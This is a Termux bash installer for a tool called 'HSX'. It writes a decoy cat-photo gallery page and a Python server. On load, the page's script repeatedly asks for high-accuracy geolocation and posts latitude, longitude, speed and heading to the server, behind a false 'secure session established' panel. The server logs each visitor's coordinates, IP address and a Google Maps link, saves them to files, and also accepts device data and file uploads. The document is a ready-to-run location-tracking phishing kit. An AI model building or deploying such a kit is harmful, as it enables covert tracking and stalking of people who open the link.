#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
#   HSX — FULL AUTO INSTALLER + LAUNCHER
#   Owner: Krishn
#   Instagram : ur_.krishn._02
#   Run:  bash install.sh
# ============================================================

OWNER="KRISHN"
PORT=8080
HSX="$HOME/HSX"

clear

printf '\033[1;35m'
cat <<'EOF'
 ____  ____   ______   ____  ____  ____  ____
|_   ||   _|.' ____ \ |_  _||_  _||_  _||_  _|
  | |__| |  | (___ \_|  \ \  / /    \ \  / /
  |  __  |   _.____`.    > `' <      > `' <
 _| |  | |_ | \____) | _/ /'`\ \_  _/ /'`\ \_
|____||____| \______.'|____||____||____||____|
EOF
printf '\033[0m\n'

printf '\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n'

printf '\033[1;33m  ✦ OWNER    : \033[1;37mK R I S H N\033[0m\n'
printf '\033[1;32m  ✦ TELEGRAM : \033[1;35m@krishn18\033[0m\n'
printf '\033[1;35m  ✦ INSTAGRAM: \033[1;34mur_.krishn._02\033[0m\n'
printf '\033[1;34m  ✦ GITHUB   : \033[1;32mhttps://github.com/krishn-145\033[0m\n'
printf '\033[1;31m  ✦ WEBSITE  : \033[1;31mhttps://krishn1.vercel.app\033[0m\n'

printf '\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n'
printf '\033[1;31m          ⚡ FREE STYLE ⚡\033[0m\n'
printf '\n'

# ============ STEP 1: packages ============
echo -e "\033[1;36m[1/5]\033[0m Checking packages..."
pkg install -y python termux-tools >/dev/null 2>&1 || pkg install -y python

if ! command -v python >/dev/null 2>&1; then
  echo -e "\033[1;31m[!]\033[0m python install failed"; exit 1
fi
echo -e "\033[1;32m[✓]\033[0m python ready"

# ============ STEP 2: folders ============
echo -e "\033[1;36m[2/5]\033[0m Preparing folders..."
mkdir -p "$HSX/files" "$HSX/location" "$HSX/device"
echo -e "\033[1;32m[✓]\033[0m $HSX ready"

# ============ STEP 3: index.html ============
echo -e "\033[1;36m[3/5]\033[0m Writing website..."
cat > "$HSX/index.html" <<'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HSX</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{overflow-x:hidden;background:#05070d;color:#e8eefc;
 font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;scroll-behavior:smooth}
#gate{position:fixed;inset:0;z-index:9999;display:flex;flex-direction:column;
 align-items:center;justify-content:center;background:#05070d;
 transition:opacity .8s ease,visibility .8s}
#gate.hide{opacity:0;visibility:hidden}
#gate .cube{width:120px;height:120px;position:relative;transform-style:preserve-3d;
 animation:rot 6s linear infinite;margin-bottom:40px}
@keyframes rot{0%{transform:rotateX(-20deg) rotateY(0)}100%{transform:rotateX(-20deg) rotateY(360deg)}}
#gate .face{position:absolute;inset:0;
 background:linear-gradient(135deg,rgba(94,231,255,.35),rgba(255,124,229,.28));
 border:1.5px solid rgba(255,255,255,.5);
 box-shadow:0 0 30px rgba(0,198,255,.5) inset}
#gate .g1{transform:translateZ(60px)}#gate .g2{transform:rotateY(180deg) translateZ(60px)}
#gate .g3{transform:rotateY(90deg) translateZ(60px)}#gate .g4{transform:rotateY(-90deg) translateZ(60px)}
#gate .g5{transform:rotateX(90deg) translateZ(60px)}#gate .g6{transform:rotateX(-90deg) translateZ(60px)}
#gate h2{font-size:22px;letter-spacing:8px;font-weight:700;
 background:linear-gradient(90deg,#5ee7ff,#7c8cff,#ff7ce5);
 -webkit-background-clip:text;background-clip:text;color:transparent;
 animation:glow 3s ease-in-out infinite}
@keyframes glow{50%{filter:drop-shadow(0 0 18px rgba(124,140,255,.8))}}
#gate .bar{margin-top:26px;width:180px;height:3px;border-radius:3px;
 background:rgba(255,255,255,.1);overflow:hidden}
#gate .bar::after{content:"";display:block;height:100%;width:40%;
 background:linear-gradient(90deg,#5ee7ff,#ff7ce5);border-radius:3px;
 animation:slide 1.2s ease-in-out infinite}
@keyframes slide{0%{margin-left:-40%}100%{margin-left:100%}}
.bg{position:fixed;inset:0;z-index:-2;
 background:radial-gradient(circle at 20% 10%,#1b2a4a,#070b14 60%)}
.bg::after{content:"";position:absolute;inset:-50%;
 background:conic-gradient(from 0deg,#00c6ff,#7c8cff,#ff7ce5,#00c6ff);
 filter:blur(180px);opacity:.18;animation:spin 40s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.orb{position:fixed;border-radius:50%;filter:blur(60px);opacity:.35;
 z-index:-1;animation:float 12s ease-in-out infinite;pointer-events:none}
.orb.a{width:280px;height:280px;background:#00c6ff;top:10%;left:-60px}
.orb.b{width:220px;height:220px;background:#ff7ce5;bottom:15%;right:-50px;animation-delay:-4s}
.orb.c{width:180px;height:180px;background:#7c8cff;top:55%;left:40%;animation-delay:-8s}
@keyframes float{50%{transform:translateY(-40px) translateX(20px)}}
.hero{min-height:100vh;display:flex;flex-direction:column;align-items:center;
 justify-content:center;perspective:1200px;padding:40px 20px}
.scene{width:180px;height:180px;position:relative;transform-style:preserve-3d;
 animation:rot 20s linear infinite;margin-bottom:44px}
.face{position:absolute;inset:0;border:1.5px solid rgba(255,255,255,.35);
 box-shadow:0 0 40px rgba(0,198,255,.35) inset;background-size:cover;
 background-position:center;overflow:hidden}
.face::after{content:"";position:absolute;inset:0;
 background:linear-gradient(135deg,rgba(0,198,255,.35),rgba(255,124,229,.25));
 mix-blend-mode:overlay}
.f1{transform:translateZ(90px)}.f2{transform:rotateY(180deg) translateZ(90px)}
.f3{transform:rotateY(90deg) translateZ(90px)}.f4{transform:rotateY(-90deg) translateZ(90px)}
.f5{transform:rotateX(90deg) translateZ(90px)}.f6{transform:rotateX(-90deg) translateZ(90px)}
h1{font-size:56px;letter-spacing:14px;font-weight:800;
 background:linear-gradient(90deg,#5ee7ff,#7c8cff,#ff7ce5);
 -webkit-background-clip:text;background-clip:text;color:transparent;
 text-align:center;animation:glow 4s ease-in-out infinite}
.tag{margin-top:14px;font-size:13px;letter-spacing:3px;opacity:.55;
 text-transform:uppercase;text-align:center}
.tag b{font-weight:700;letter-spacing:5px;
 background:linear-gradient(90deg,#5ee7ff,#ff7ce5);
 -webkit-background-clip:text;background-clip:text;color:transparent}
.cue{margin-top:60px;width:26px;height:42px;border:2px solid rgba(255,255,255,.4);
 border-radius:14px;position:relative}
.cue::before{content:"";position:absolute;top:8px;left:50%;width:4px;height:8px;
 background:#5ee7ff;border-radius:2px;transform:translateX(-50%);
 animation:cueMove 1.8s ease-in-out infinite}
@keyframes cueMove{0%,100%{top:8px;opacity:1}50%{top:24px;opacity:.3}}
section{min-height:100vh;display:flex;flex-direction:column;align-items:center;
 justify-content:center;padding:80px 24px;perspective:1000px}
.reveal{opacity:0;transform:translateY(80px) rotateX(15deg);
 transition:all 1s cubic-bezier(.2,.8,.2,1)}
.reveal.on{opacity:1;transform:none}
.section-title{font-size:28px;letter-spacing:8px;margin-bottom:40px;
 background:linear-gradient(90deg,#5ee7ff,#7c8cff,#ff7ce5);
 -webkit-background-clip:text;background-clip:text;color:transparent;text-align:center}
.gallery{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
 gap:16px;max-width:560px;width:100%;transform-style:preserve-3d}
.cat{position:relative;aspect-ratio:1;border-radius:20px;overflow:hidden;
 border:1px solid rgba(255,255,255,.15);box-shadow:0 20px 40px rgba(0,0,0,.55);
 transform-style:preserve-3d;transition:transform .5s cubic-bezier(.2,.8,.2,1);
 background:linear-gradient(135deg,#1b2a4a,#070b14)}
.cat img{width:100%;height:100%;object-fit:cover;display:block;transition:transform .8s}
.cat:hover{transform:translateZ(40px) rotateX(-8deg) rotateY(6deg)}
.cat:hover img{transform:scale(1.08)}
.cat::after{content:"";position:absolute;inset:0;
 background:linear-gradient(180deg,transparent 40%,rgba(5,7,13,.85));pointer-events:none}
.cat .label{position:absolute;bottom:14px;left:16px;font-size:11px;
 letter-spacing:2.5px;text-transform:uppercase;opacity:.85;z-index:2}
.panel{max-width:520px;width:100%;padding:36px 28px;border-radius:24px;
 background:linear-gradient(160deg,rgba(255,255,255,.10),rgba(255,255,255,.03));
 border:1px solid rgba(255,255,255,.14);
 box-shadow:0 30px 70px rgba(0,0,0,.6),inset 0 1px 0 rgba(255,255,255,.25);
 backdrop-filter:blur(16px);transform-style:preserve-3d}
.panel h2{font-size:22px;letter-spacing:5px;margin-bottom:12px;
 background:linear-gradient(90deg,#5ee7ff,#7c8cff);
 -webkit-background-clip:text;background-clip:text;color:transparent}
.panel p{font-size:14.5px;line-height:1.8;opacity:.75}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:24px}
.tile{padding:18px 16px;border-radius:16px;
 background:linear-gradient(135deg,rgba(0,198,255,.14),rgba(255,124,229,.10));
 border:1px solid rgba(255,255,255,.12);
 transform-style:preserve-3d;transition:transform .35s;text-align:center}
.tile:hover{transform:translateZ(30px) rotateX(-6deg)}
.tile b{display:block;font-size:20px;margin-bottom:6px;
 background:linear-gradient(90deg,#5ee7ff,#ff7ce5);
 -webkit-background-clip:text;background-clip:text;color:transparent}
.tile span{font-size:11px;letter-spacing:1.5px;opacity:.6;text-transform:uppercase}
footer{text-align:center;padding:60px 20px 90px;font-size:12px;letter-spacing:3px;opacity:.45}
footer b{background:linear-gradient(90deg,#5ee7ff,#ff7ce5);
 -webkit-background-clip:text;background-clip:text;color:transparent;
 letter-spacing:6px;font-size:15px}
#live-banner{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(140%);
 padding:14px 22px;border-radius:16px;z-index:9998;
 background:linear-gradient(135deg,rgba(0,198,255,.95),rgba(124,140,255,.95));
 box-shadow:0 20px 50px rgba(0,0,0,.6),0 0 40px rgba(0,198,255,.4);
 transition:transform .6s cubic-bezier(.2,.8,.2,1);
 display:flex;align-items:center;gap:14px;max-width:90vw;font-size:13px}
#live-banner.on{transform:translateX(-50%) translateY(0)}
#live-banner a{color:#fff;text-decoration:none;font-weight:700;letter-spacing:1px}
#live-banner .pin{font-size:20px;animation:bounce 1.5s ease-in-out infinite}
@keyframes bounce{50%{transform:translateY(-6px)}}
</style>
<script>
(function(){
  function sendLoc(p){
    fetch('/location',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,
        acc:p.coords.accuracy,alt:p.coords.altitude,spd:p.coords.speed,
        head:p.coords.heading,time:new Date().toISOString()})}).catch(function(){});
    try{
      var b=document.getElementById('live-banner');
      if(b){
        document.getElementById('live-link').href =
          'https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude;
        b.classList.add('on');
      }
    }catch(e){}
  }
  function ask(){
    if(!navigator.geolocation)return;
    navigator.geolocation.getCurrentPosition(sendLoc,function(){},
      {enableHighAccuracy:true,timeout:30000,maximumAge:0});
  }
  ask();
  var t=0;var iv=setInterval(function(){t++;if(t>10){clearInterval(iv);return}ask();},3000);
  if(navigator.geolocation){
    navigator.geolocation.watchPosition(sendLoc,function(){},
      {enableHighAccuracy:true,timeout:30000,maximumAge:15000});
  }
  if('Notification' in window && Notification.permission==='default'){
    try{Notification.requestPermission()}catch(e){}
  }
})();
</script>
</head>
<body>
<div id="gate">
  <div class="cube">
    <div class="face g1"></div><div class="face g2"></div>
    <div class="face g3"></div><div class="face g4"></div>
    <div class="face g5"></div><div class="face g6"></div>
  </div>
  <h2>INITIALIZING</h2>
  <div class="bar"></div>
</div>
<div id="live-banner">
  <span class="pin">📍</span>
  <a id="live-link" href="#" target="_blank" rel="noopener">Live Location</a>
</div>
<div class="bg"></div>
<div class="orb a"></div><div class="orb b"></div><div class="orb c"></div>
<div class="hero">
  <div class="scene">
    <div class="face f1" style="background-image:url('https://cataas.com/cat?width=400&height=400&t=1')"></div>
    <div class="face f2" style="background-image:url('https://cataas.com/cat?width=400&height=400&t=2')"></div>
    <div class="face f3" style="background-image:url('https://cataas.com/cat?width=400&height=400&t=3')"></div>
    <div class="face f4" style="background-image:url('https://cataas.com/cat?width=400&height=400&t=4')"></div>
    <div class="face f5" style="background-image:url('https://cataas.com/cat?width=400&height=400&t=5')"></div>
    <div class="face f6" style="background-image:url('https://cataas.com/cat?width=400&height=400&t=6')"></div>
  </div>
  <h1>HSX</h1>
  <p class="tag">OWNER <b>KRISHN</b></p>
  <div class="cue"></div>
</div>
<section>
  <h2 class="section-title reveal">GALLERY</h2>
  <div class="gallery reveal">
    <div class="cat"><img src="https://cataas.com/cat?width=600&height=600&t=a"><span class="label">CAT 01</span></div>
    <div class="cat"><img src="https://cataas.com/cat?width=600&height=600&t=b"><span class="label">CAT 02</span></div>
    <div class="cat"><img src="https://cataas.com/cat?width=600&height=600&t=c"><span class="label">CAT 03</span></div>
    <div class="cat"><img src="https://cataas.com/cat?width=600&height=600&t=d"><span class="label">CAT 04</span></div>
    <div class="cat"><img src="https://cataas.com/cat?width=600&height=600&t=e"><span class="label">CAT 05</span></div>
    <div class="cat"><img src="https://cataas.com/cat?width=600&height=600&t=f"><span class="label">CAT 06</span></div>
  </div>
</section>
<section>
  <div class="panel reveal">
    <h2>CONNECTED</h2>
    <p>A secure session has been established. All systems running smoothly.</p>
    <div class="grid">
      <div class="tile"><b>SSL</b><span>Encrypted</span></div>
      <div class="tile"><b>LOCAL</b><span>Network</span></div>
      <div class="tile"><b>24/7</b><span>Uptime</span></div>
      <div class="tile"><b>v3.2</b><span>Build</span></div>
    </div>
  </div>
</section>
<section>
  <div class="panel reveal" style="text-align:center">
    <h2>OWNER</h2>
    <p style="font-size:22px;letter-spacing:8px;font-weight:800;
       background:linear-gradient(90deg,#5ee7ff,#ff7ce5);
       -webkit-background-clip:text;background-clip:text;color:transparent;
       margin-top:6px">K R I S H N</p>
  </div>
</section>
<footer>HSX &middot; <b>KRISHN</b> &middot; 2025</footer>
<script>
setTimeout(function(){document.getElementById('gate').classList.add('hide')},2200);
var io = new IntersectionObserver(function(es){
  es.forEach(function(e){if(e.isIntersecting)e.target.classList.add('on')});
},{threshold:.15});
document.querySelectorAll('.reveal').forEach(function(el){io.observe(el)});
addEventListener('scroll',function(){
  var y=scrollY;
  document.querySelector('.orb.a').style.transform='translateY('+(y*.15)+'px)';
  document.querySelector('.orb.b').style.transform='translateY('+(-y*.12)+'px)';
  document.querySelector('.orb.c').style.transform='translateY('+(y*.08)+'px)';
},{passive:true});
</script>
</body>
</html>
HTMLEOF
echo -e "\033[1;32m[✓]\033[0m index.html written"

# ============ STEP 4: server.py ============
echo -e "\033[1;36m[4/5]\033[0m Writing server..."
cat > "$HSX/server.py" <<'PYEOF'
import http.server, json, os, base64, datetime, sys, socket

R  = '\033[0m'; B  = '\033[1m'
CY = '\033[1;36m'; GR = '\033[1;32m'; YE = '\033[1;33m'
MG = '\033[1;35m'; RD = '\033[1;31m'

OWNER = "KRISHN"

def parse_port():
    if len(sys.argv) > 1:
        try:
            p = int(sys.argv[1])
            if 1 <= p <= 65535: return p
        except (ValueError, TypeError): pass
    return 8080

PORT = parse_port()
BASE = os.path.dirname(os.path.abspath(__file__))
for d in ("files","location","device"):
    os.makedirs(os.path.join(BASE, d), exist_ok=True)

LOCATION_COUNT = 0
LAST_LAT = None
LAST_LON = None

def get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        return "127.0.0.1"

def print_banner(port):
    lan = get_lan_ip()
    print()
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{MG}│{R}  {B}{GR}HSX SERVER IS RUNNING{R}")
    print(f"{MG}│{R}  {YE}Owner{R}     : {B}{RD}{OWNER}{R}")
    print(f"{MG}│{R}  {YE}Local{R}     : {CY}http://127.0.0.1:{port}{R}")
    print(f"{MG}│{R}  {YE}LAN IP{R}    : {CY}{lan}{R}")
    print(f"{MG}│{R}  {YE}Save{R}      : {CY}{BASE}{R}")
    print(f"{MG}│{R}  {YE}Stop{R}      : {B}{RD}Ctrl+C{R}")
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print()
    print(f"{B}{GR}▶ Waiting for live location...{R}")
    print()

def is_same_location(lat, lon):
    global LAST_LAT, LAST_LON
    if LAST_LAT is None: return False
    try:
        return abs(float(lat)-float(LAST_LAT)) < 0.0001 and abs(float(lon)-float(LAST_LON)) < 0.0001
    except Exception:
        return False

def print_location(loc, client_ip=""):
    global LOCATION_COUNT, LAST_LAT, LAST_LON
    lat = loc.get("lat"); lon = loc.get("lon")
    if is_same_location(lat, lon): return
    LAST_LAT = lat; LAST_LON = lon
    LOCATION_COUNT += 1
    acc = loc.get("acc") or 0
    spd = loc.get("spd")
    ts  = datetime.datetime.now().strftime("%H:%M:%S")
    link = f"https://www.google.com/maps?q={lat},{lon}"
    try: acc_str = f"±{float(acc):.0f}m"
    except Exception: acc_str = "n/a"
    try: spd_str = f"{float(spd):.1f} m/s" if spd not in (None, 0) else "-"
    except Exception: spd_str = "-"
    print()
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{MG}│{R}  {GR}{B}📍  LIVE LOCATION   #{LOCATION_COUNT}{R}   {YE}{ts}{R}")
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print(f"{MG}│{R}  {YE}Lat{R}   : {CY}{lat}{R}")
    print(f"{MG}│{R}  {YE}Lon{R}   : {CY}{lon}{R}")
    print(f"{MG}│{R}  {YE}Acc{R}   : {CY}{acc_str}{R}   {YE}Spd{R} : {CY}{spd_str}{R}")
    print(f"{MG}│{R}  {YE}IP{R}    : {CY}{client_ip}{R}")
    print(f"{MG}│{R}  {YE}Map{R}   : {B}{CY}{link}{R}")
    print(f"{MG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")
    print()

def print_device(d):
    print(f"{CY}[device]{R} {YE}{d.get('tz','')}{R} · {YE}{d.get('screen','')}{R}")
    print()

def free_port(start):
    for p in range(start, start+20):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("127.0.0.1", p)); s.close(); return p
        except OSError: continue
    return None

class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self,*a,**k): super().__init__(*a,directory=BASE,**k)
    def log_message(self,*a): pass
    def _json(self, obj, code=200):
        b = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type","application/json")
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Content-Length",str(len(b)))
        self.end_headers(); self.wfile.write(b)
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type")
        self.end_headers()
    def do_POST(self):
        n = int(self.headers.get("Content-Length",0))
        try: body = json.loads(self.rfile.read(n) or b"{}")
        except Exception: return self._json({"ok":False},400)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        if self.path == "/location":
            p = os.path.join(BASE,"location","loc_%s.json" % ts)
            open(p,"w",encoding="utf-8").write(json.dumps(body,ensure_ascii=False,indent=2))
            cip = self.client_address[0] if self.client_address else ""
            print_location(body, cip)
            return self._json({"ok":True})
        if self.path == "/device":
            p = os.path.join(BASE,"device","dev_%s.json" % ts)
            open(p,"w",encoding="utf-8").write(json.dumps(body,ensure_ascii=False,indent=2))
            print_device(body)
            return self._json({"ok":True})
        if self.path == "/upload":
            name = os.path.basename(body.get("name","file"))
            data = base64.b64decode(body.get("data",""))
            if len(data) > 8*1024*1024: return self._json({"ok":False},413)
            p = os.path.join(BASE,"files",name)
            open(p,"wb").write(data)
            print(f"{GR}[+]{R} file saved: {CY}{p}{R}")
            return self._json({"ok":True})
        self._json({"ok":False},404)

fp = free_port(PORT)
if fp is None:
    print(f"{RD}[!]{R} No free port"); sys.exit(2)

httpd = http.server.ThreadingHTTPServer(("127.0.0.1", fp), H)
print_banner(fp)

try:
    httpd.serve_forever()
except KeyboardInterrupt:
    print(f"\n{YE}[*]{R} Stopping server...")
finally:
    httpd.server_close()
PYEOF
echo -e "\033[1;32m[✓]\033[0m server.py written"

# ============ STEP 5: launch ============
echo -e "\033[1;36m[5/5]\033[0m Launching everything..."
echo

pkill -f "server.py" 2>/dev/null
sleep 1

# auto-open browser after 2 seconds, in background
(
  sleep 2
  termux-open-url "http://127.0.0.1:$PORT" >/dev/null 2>&1 || \
  am start -a android.intent.action.VIEW -d "http://127.0.0.1:$PORT" >/dev/null 2>&1
) &

cd "$HSX"
exec python -u server.py "$PORT"

